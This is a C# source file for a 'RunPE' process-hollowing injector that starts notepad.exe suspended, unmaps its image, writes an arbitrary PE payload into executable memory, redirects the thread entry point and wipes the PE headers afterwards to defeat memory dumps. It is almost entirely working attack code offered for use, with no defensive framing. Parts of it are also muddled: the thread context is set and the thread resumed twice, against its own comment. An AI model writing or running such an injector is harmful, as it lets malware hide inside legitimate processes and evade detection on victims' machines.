// Cross-architecture PE injection with memory stealth
// Injects 32-bit or 64-bit PE into notepad.exe (spawned suspended)

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

public class RunPE
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize;
        public uint dwXCountChars, dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT64
    {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15;
        public ulong Rip;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
        public byte[] Reserved;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcess(string appName, string cmdLine, IntPtr p1, IntPtr p2, bool bInherit, uint flags,
        IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr baseAddr, byte[] buffer, int size, out IntPtr written);

    [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr addr, uint size, uint allocType, uint protect);
    [DllImport("ntdll.dll", SetLastError = true)] static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
    [DllImport("kernel32.dll")] static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 ctx);
    [DllImport("kernel32.dll")] static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 ctx);
    [DllImport("kernel32.dll")] static extern uint ResumeThread(IntPtr hThread);

    public static void Inject(byte[] peBuffer, bool is64bit)
    {
        string host = is64bit ? @"C:\\Windows\\System32\\notepad.exe" : @"C:\\Windows\\SysWOW64\\notepad.exe";

        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        si.cb = (uint)Marshal.SizeOf(si);

        bool ok = CreateProcess(host, null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
        if (!ok) return;

        int e_lfanew = BitConverter.ToInt32(peBuffer, 0x3C);
        int optHeaderOffset = e_lfanew + 0x18;
        int imageBaseOffset = optHeaderOffset + (is64bit ? 0x18 : 0x1C);
        long imageBase = is64bit ? BitConverter.ToInt64(peBuffer, imageBaseOffset) : BitConverter.ToUInt32(peBuffer, imageBaseOffset);
        int entryPoint = BitConverter.ToInt32(peBuffer, optHeaderOffset + 0x10);
        int imageSize = BitConverter.ToInt32(peBuffer, optHeaderOffset + 0x38);

        NtUnmapViewOfSection(pi.hProcess, (IntPtr)imageBase);

        IntPtr baseAddr = VirtualAllocEx(pi.hProcess, (IntPtr)imageBase, (uint)imageSize, 0x3000, 0x40);
        if (baseAddr == IntPtr.Zero) return;

        IntPtr tmp;
        WriteProcessMemory(pi.hProcess, baseAddr, peBuffer, 0x200, out tmp); // write headers

        short numSections = BitConverter.ToInt16(peBuffer, e_lfanew + 6);
        int sectionOffset = e_lfanew + 0xF8;
        for (int i = 0; i < numSections; i++)
        {
            int raw = BitConverter.ToInt32(peBuffer, sectionOffset + 0x14);
            int vaddr = BitConverter.ToInt32(peBuffer, sectionOffset + 0x0C);
            int size = BitConverter.ToInt32(peBuffer, sectionOffset + 0x10);
            if (raw == 0 || size == 0) { sectionOffset += 0x28; continue; }
            byte[] data = new byte[size];
            Buffer.BlockCopy(peBuffer, raw, data, 0, size);
            WriteProcessMemory(pi.hProcess, baseAddr + vaddr, data, data.Length, out tmp);
            sectionOffset += 0x28;
        }

        CONTEXT64 ctx = new CONTEXT64();
        ctx.ContextFlags = 0x100000; // CONTEXT_CONTROL
        ctx.Reserved = new byte[512];
        GetThreadContext(pi.hThread, ref ctx);
        ctx.Rcx = (ulong)baseAddr + (uint)entryPoint; // set entry
        SetThreadContext(pi.hThread, ref ctx);

        ResumeThread(pi.hThread);
        // 🧹 Anti-dump: wipe PE headers in memory
        byte[] wipe = new byte[0x200];
        WriteProcessMemory(pi.hProcess, baseAddr, wipe, wipe.Length, out tmp);

        // Setup thread context
        CONTEXT64 ctx64 = new CONTEXT64();
        ctx64.ContextFlags = 0x100000; // CONTEXT_CONTROL
        ctx64.Reserved = new byte[512];

        GetThreadContext(pi.hThread, ref ctx64);
        ctx64.Rcx = (ulong)baseAddr + (uint)entryPoint; // set entry
        SetThreadContext(pi.hThread, ref ctx64);

        // Resume thread once (only here)
        ResumeThread(pi.hThread);

    }
}
 